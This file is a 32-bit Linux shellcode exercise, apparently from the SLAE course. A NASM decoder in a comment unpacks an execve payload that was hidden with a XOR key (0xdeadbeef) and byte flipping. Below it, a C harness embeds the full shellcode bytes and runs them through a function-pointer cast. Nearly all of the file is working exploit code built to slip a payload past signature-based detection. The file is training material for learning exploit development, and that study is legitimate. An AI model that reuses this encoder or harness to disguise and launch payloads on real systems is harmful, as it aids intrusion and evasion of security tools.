/*
; Filename: 	dead_decoder.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This shellcode will decode an execve payload encoded using
;		custom schema, with XOR and byte flipping

global _start			

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; As assumption, the first double word in our shellcode is the XOR
	; encoded payload length
	mov edx, dword [esi + eax]
	xor edx, 0xdeadbeef
	
	add al, 4
	
decode:
	mov ebx, dword [esi+eax]
	inc ecx
	cmp cl, dl
	je short EncodedShellcode

	; shellcode is stored in a reversed way. Let' XOR-it
	xor ebx, 0xdeadbeef

	; Now we have to swap again bytes before saving into memory
	bswap ebx

	mov [edi], ebx
	add edi, 4
	add al, 4
	
	jmp short decode


call_shellcode:
	call decoder
	EncodedShellcode: db 0xf7, 0xa6, 0xb5, 0xc6, 0x87, 0xee, 0x6d, 0xef, 0x87, 0xcd, 0x82, 0xf1, 0x86, 0xdc, 0x82, 0xb6, 0xde, 0x5d, 0x24, 0xb0, 0x5f, 0x6c, 0x9c, 0x17, 0x7f, 0x3e, 0x60, 0xd5

 */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2f\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8b\x14\x06\x81\xf2\xef\xbe\xad\xde\x04\x04\x8b\x1c\x06\x41\x38\xd1\x74\x16\x81\xf3\xef\xbe\xad\xde\x0f\xcb\x89\x1f\x83\xc7\x04\x04\x04\xeb\xe7\xe8\xcc\xff\xff\xff\xf7\xa6\xb5\xc6\x87\xee\x6d\xef\x87\xcd\x82\xf1\x86\xdc\x82\xb6\xde\x5d\x24\xb0\x5f\x6c\x9c\x17\x7f\x3e\x60\xd5";

		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
